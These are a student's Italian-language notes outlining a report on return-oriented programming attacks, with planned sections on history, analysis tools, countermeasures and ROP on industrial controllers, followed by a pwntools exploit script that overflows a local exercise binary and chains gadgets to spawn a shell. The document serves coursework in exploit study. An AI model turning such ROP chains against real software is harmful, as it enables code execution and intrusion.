
Scaletta per report:
1. Cos'è un attacco ROP, rif. al paper di Campion
	- origine e storia
	- parentesi su attacchi return-to-libc
	- funzionamento
2. Esempi pratici, quindi i due esercizi dati spiegati nel dettaglio
	- analisi preliminare (checksec, disass, ghidra, codice sorgente)
	- tool usati per l'analisi dinamica dell'eseguibile
	- tool per la ricerca di gadgets (ropper)
	- fasi dell'attacco
3. Contromisure applicabili per arginare tali tipologie di attacchi
	- Addresses randomizations (non proprio sicura se si trova l'offset)
	- altre contromisure che ora non saprei ahaha
4. ROP in contesti moderni
	- [Gadgets of Gadgets in Industrial Control Systems: Return Oriented Programming Attacks on PLCs | IEEE Conference Publication | IEEE Xplore](https://ieeexplore.ieee.org/document/10132957)

Paper letti e magari citati:
- [The geometry of innocent flesh on the bone | Proceedings of the 14th ACM conference on Computer and communications security](https://dl.acm.org/doi/10.1145/1315245.1315313)
- [Overview of an industrial control system environment contributes to... | Download Scientific Diagram](https://www.researchgate.net/figure/Overview-of-an-industrial-control-system-environment-contributes-to-this-direction-and_fig1_370224876)



Exploit per il primo binario ricevuto:
```python
from pwn import *

# addresses of the functions
exec_string_addr = p32(0x80491b6)
add_bin_addr = p32(0x80491e5)
add_sh_addr = p32(0x8049236)

# pop instructions
pop_ret = p32(0x08049022)
pop_pop_ret = p32(0x08049233)

# magic strings
magic = p32(0xdeadbeef)
magic1 = p32(0xcafebabe)
magic2 = p32(0x0badf00d)

arg = b'A' * 112

# craft the payloads
payload = arg
payload += add_bin_addr
payload += pop_ret
payload += magic
payload += add_sh_addr
payload += pop_pop_ret
payload += magic1
payload += magic2
payload += exec_string_addr

bin = "./es"
p = process([bin, payload])
# p = gdb.debug([bin, payload], gdbscript="b main\nb *0x80492ba\nr")

p.interactive()
```

